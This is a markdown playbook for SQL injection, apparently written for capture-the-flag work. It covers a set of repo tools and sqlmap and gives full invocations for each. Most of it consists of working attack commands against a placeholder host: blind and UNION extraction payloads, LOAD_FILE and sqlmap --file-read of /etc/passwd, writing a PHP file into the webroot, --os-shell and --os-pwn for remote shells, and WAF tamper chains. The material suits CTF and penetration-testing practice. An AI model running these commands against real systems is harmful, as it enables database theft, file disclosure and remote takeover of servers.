# Tooling — repo tools + sqlmap, the right invocations

The repo tools are the *bounded* path — they emit the evidence
shape `hooks.py` wants and stop on their own falsifiers. sqlmap is
the heavy path — deep and correct but slow and noisy; invoke it
when the repo tools have confirmed the channel and you want
automation depth, not when you're still hunting for the channel.

---

## 1. `tools/web/sqli_probe.py` — the detector

Runs baseline + quote + true/false + sleep matrices against one
parameter and prints the channel verdict:

```bash
python3 tools/web/sqli_probe.py --url 'http://t/item' --param id \
        --method GET
python3 tools/web/sqli_probe.py --url 'http://t/login' --method POST \
        --body 'u={M}&p=x' --param u      # {M} marks the injection slot
python3 tools/web/sqli_probe.py --url 'http://t/api' \
        --headers 'X-User-Id: {M}' --param X-User-Id
python3 tools/web/sqli_probe.py --url 'http://t/item?id=1' \
        --param id --order-by 30        # column-count via ORDER BY
```

Output shape:

```text
baseline:     200 OK  1234 bytes
quote:        500     /sql syntax/    →  injectable quote
true:         200     1234 bytes      →  delta over baseline
false:        200     1189 bytes      →  matched delta → boolean oracle
sleep(3):     3.04s                  →  time channel live
order-by:     col_count=3            →  UNION-ready
```

Read it like this: the FIRST pair that shows a clean true/false
delta is your oracle. Nothing delta → try the other param, then
`variant_matrix.py` to shape-hunt.

---

## 2. `tools/web/sqli_union.py` — UNION discovery

```bash
python3 tools/web/sqli_union.py --url 'http://t/item?id=1' \
        --param id find                            # locate reflected col
python3 tools/web/sqli_union.py --url 'http://t/item?id=1' \
        --param id find --cols 8                   # test wider unions
python3 tools/web/sqli_union.py --url 'http://t/item' --param id \
        --method POST --body 'id={M}&x=2' find
python3 tools/web/sqli_union.py --url 'http://t/item?id=1' \
        --param id sql --cols 4 --pos 2 \
        --expr 'version()'                         # pull an expression
```

Finds the column count and which position reflects — the slot for
`version()`/`user()`/`group_concat`. Then `sql` mode puts your
expression in that position:

```text
columns=4   reflected=[2]   string_col=2   → use position 2
```

Feed that into your UNION payload at position 2 — every extra
`NULL` in the right slot. `--prefix`/`--suffix` wrap the payload
when the context needs closer/comment strings.

---

## 3. `tools/web/sqli_extract.py` — blind extractor

Drives the boolean/time oracle and emits the extraction log:

```bash
python3 tools/web/sqli_extract.py --url 'http://t/item?id=1' \
        --param id --inject "' AND ASCII(SUBSTRING(({sql}),{i},1))>{m}-- -" \
        --sql 'SELECT flag FROM secrets LIMIT 1' \
        --true-regex 'Welcome'             # what a TRUE looks like
python3 tools/web/sqli_extract.py --url 'http://t/login' --method POST \
        --body 'u={M}&p=x' --param u \
        --inject "x' AND ASCII(SUBSTRING(({sql}),{i},1))>{m}-- -" \
        --sql 'SELECT password FROM users WHERE user="admin"' \
        --true-regex 'Welcome back'
python3 tools/web/sqli_extract.py --url 'http://t/item?id=1' \
        --param id --inject "' AND IF(ASCII(SUBSTRING(({sql}),{i},1))>{m},SLEEP(3),0)-- -" \
        --sql 'SELECT version()' --time-secs 3   # time oracle
```

`{sql}`/`{i}`/`{m}` are the inject template slots — the tool
substitutes the wrapped query, char position and binary-search
midpoint. Other oracle discriminators: `--true-status 200`,
`--true-len 1234`, or `--time-secs` for delay channels. `--charset`
and `--max-chars` bound the search alphabet and length. The request
log it writes IS the `hooks.py` evidence — keep it.

Pagination — loop the `LIMIT`/`OFFSET`/`ROWNUM` part inside `--sql`
yourself:

```bash
for i in 0 1 2 3 4; do
  python3 tools/web/sqli_extract.py ... \
     --sql "SELECT flag FROM secrets LIMIT $i,1"
done
```

---

## 4. `tools/web/variant_matrix.py` — the shape hunter

When sqli_probe says nothing but you KNOW the param is reached —
this tool sends one request per payload SHAPE (not keyword variants)
across ten families, diffs each vs baseline, and prints the ranked
delta:

```bash
python3 tools/web/variant_matrix.py --url 'http://t/item?id=1' \
        --param id --dry-run           # print the matrix, send nothing
python3 tools/web/variant_matrix.py --url 'http://t/item?id=1' \
        --param id                     # fire it
python3 tools/web/variant_matrix.py --url 'http://t/login' \
        --method POST --form-field u --body 'u=x&p=x' \
        --write-ack                                # write-shaped forms
```

Each row is a shape (boolean-pair, error-payload, union-probe,
comment-terminator, paren-closer...) — a hit names the shape that
works, so you're no longer guessing keyword spellings.

`--write-ack` is required for shapes that mutate — the tool refuses
otherwise. Honour it: on a shared instance the gate is the
safety catch.

---

## 5. `tools/web/http_probe.py` — one request, full evidence

When you have a specific payload and need the verbatim
request/response preserved:

```bash
python3 tools/web/http_probe.py --url 'http://t/item?id=1%27' \
        --method GET --challenge <name> --class sqli \
        --evidence-regex 'syntax|error|mysql|psql' \
        --on-match confirms --emit
python3 tools/web/http_probe.py --url 'http://t/login' --method POST \
        --body 'u=x%27&p=x' --challenge <name> --class sqli \
        --evidence-contains 'error' --on-match confirms
```

`--emit` runs `hooks.py pre-probe` then `post-probe` for you; without
it the tool prints the whole post-probe command with `--response`
pre-filled — the flow the evidence gate wants. `--challenge` and
`--class` are required because the verdict lands in the hypothesis
ledger, not just on screen.

---

## 6. `tools/web/sanitizer_fuzz.py` — encoding sweep

When a character is being filtered — which encoding survives?

```bash
python3 tools/web/sanitizer_fuzz.py --url 'http://t/item?id=1{payload}' \
        --forbidden "'"                  # the blocked byte
python3 tools/web/sanitizer_fuzz.py --url 'http://t/item?id=1{payload}' \
        --forbidden 'UNION' --forbidden ' ' --families raw,entity,unicode
```

Prints per-encoding reach: which `'`/`%27`/`%2527`/`\u0027`/
`&#39;`/double-encode etc. made it to the SQL layer. The hit
encoding is the one to wrap your payload in — `waf-evasion.md` §4.
`--field` renames the `{payload}` placeholder; `--families` picks
raw/entity/splice/unicode/zerowidth/wrapper subsets.

---

## 7. `tools/web/id_sweep.py` / `read_loop.py`

`id_sweep.py` — existence-oracle loop for `?id=N` params. When the
injectable thing is "does this row exist", it drives the enum for
you:

```bash
python3 tools/web/id_sweep.py --url 'http://t/user?id={id}' \
        --range 1-500 --hit-regex 'profile'
python3 tools/web/id_sweep.py --url 'http://t/user?id={ids}' \
        --bulk 50 --hit-regex '"id":([0-9]+)' --no-baseline
```

`read_loop.py` — proven file-read walk: when the primitive is a
file-read (LOAD_FILE returning content, a vuln LFI, etc), this
walks a wordlist of paths and logs hits. `{path}` is the template
slot — it can sit in the URL, body or header:

```bash
python3 tools/web/read_loop.py \
        --url "http://t/item?id=1' UNION SELECT LOAD_FILE('{path}'),NULL-- -" \
        --profile quick
python3 tools/web/read_loop.py --url 'http://t/read?p={path}' \
        --path /etc/passwd --path /flag --decode auto \
        --extract '"content":"([^"]+)"'
```

---

## 8. sqlmap — the heavy path, invoked right

sqlmap is the right tool when the channel is confirmed and the
target resists the cheap path — e.g. WAF layering, weird
second-order flow, or a param the repo tools don't shape. The
bounded invocations:

```bash
# safe default — level 1, risk 1, batch (no prompts), single thread
sqlmap -u 'http://t/item?id=1' --batch --level=1 --risk=1 --threads=1

# POST form
sqlmap -u 'http://t/login' --data 'u=x&p=x' -p u --batch

# with cookies
sqlmap -u 'http://t/admin' --cookie 'session=abc' --batch

# header injection
sqlmap -u 'http://t/' --headers='X-Forwarded-For: 127.0.0.1' \
       -p X-Forwarded-For --batch

# JSON body
sqlmap -u 'http://t/api' --data '{"id":"1"}' \
       --headers='Content-Type: application/json' -p id --batch

# direct DB (when you have creds — faster, no HTTP)
sqlmap -d 'mysql://user:pass@host/db' --batch --dump

# force a technique (skip the sweep)
sqlmap -u 'http://t/item?id=1' --technique=U --batch     # union only
sqlmap -u 'http://t/item?id=1' --technique=B --batch     # boolean
sqlmap -u 'http://t/item?id=1' --technique=T --batch     # time
sqlmap -u 'http://t/item?id=1' --technique=E --batch     # error
sqlmap -u 'http://t/item?id=1' --technique=S --batch     # stacked
sqlmap -u 'http://t/item?id=1' --technique=Q --batch     # inline query

# extraction targets
sqlmap -u '...' --batch --dbs                        # databases
sqlmap -u '...' --batch -D app --tables               # tables in db
sqlmap -u '...' --batch -D app -T users --columns     # columns
sqlmap -u '...' --batch -D app -T users -C user,pass --dump
sqlmap -u '...' --batch -D app --dump-all --exclude-sysdbs

# file ops
sqlmap -u '...' --file-read '/etc/passwd'
sqlmap -u '...' --file-write '/tmp/s.php' --file-dest '/var/www/html/s.php'

# exec
sqlmap -u '...' --os-cmd 'id'
sqlmap -u '...' --os-shell
sqlmap -u '...' --os-pwn          # meterpreter if you have it

# tamper scripts (WAF) — chain them
sqlmap -u '...' --tamper=between,space2comment,charencode --batch
sqlmap -u '...' --tamper=randomcase,equaltolike,space2dash --batch
sqlmap -u '...' --tamper=apostrophemask,apostrophenullencode --batch

# second-order: tell sqlmap where the read happens
sqlmap -u 'http://t/register' --data 'name=x&p=y' -p name \
       --second-req 'http://t/admin/users' --batch

# flush cache / fresh run
sqlmap -u '...' --flush-session --fresh-queries --batch

# proxy through Burp to see the requests
sqlmap -u '...' --proxy='http://127.0.0.1:8080' --batch
```

`--level`/`--risk` raise the aggressiveness — keep at 1 in CTF;
higher = slower and noisier.

sqlmap's session file lives at `~/.local/share/sqlmap/output/<host>`
— `--flush-session` clears a stuck cache.

---

## 9. Manual curl — when everything else is noise

Sometimes the cleanest signal is one curl:

```bash
curl -sS 'http://t/item?id=1%27' -o /tmp/err.html && grep -i sql /tmp/err.html
curl -sS 'http://t/item?id=1%27%20AND%20%271%27=%271' -o /tmp/t.html
curl -sS 'http://t/item?id=1%27%20AND%20%271%27=%272' -o /tmp/f.html
diff /tmp/t.html /tmp/f.html          # the delta is the oracle signal
curl -sS -w '%{time_total}\n' 'http://t/item?id=1%20AND%20SLEEP(3)' -o /dev/null
curl -sS 'http://t/login' -d 'u=admin%27--%20-&p=x' -c /tmp/cookies -i
```

---

## 10. The order — cheapest to heaviest

```text
1. sqli_probe           (does the channel exist?)
2. variant_matrix       (which shape lands?)
3. sqli_union           (UNION col count?)
4. sqli_extract         (blind pull, if no UNION/error)
5. http_probe           (evidence-grade single requests)
6. sqlmap --level=1     (when above confirmed but target resists)
7. sqlmap --level=3-5   (rare; slow; WAF-ladders)
8. curl                 (forensics on one specific request)
```

sqlmap is the escalator, not the opener — it costs minutes to what
`sqli_probe` answers in seconds.

---

## 11. Selftests — prove the tools before trusting them

```bash
python3 tools/web/selftest.py           # the web-tools suite (8 cases)
python3 tools/web/sqli_probe.py --selftest   # if the tool has one
python3 tools/web/selftest.py sqli_union    # per-tool if available
```

A tool that fails its selftest is a tool you can't cite. Run the
selftest before the first real invocation when the environment is
fresh — `test/run_all.sh` does it for everything at once.
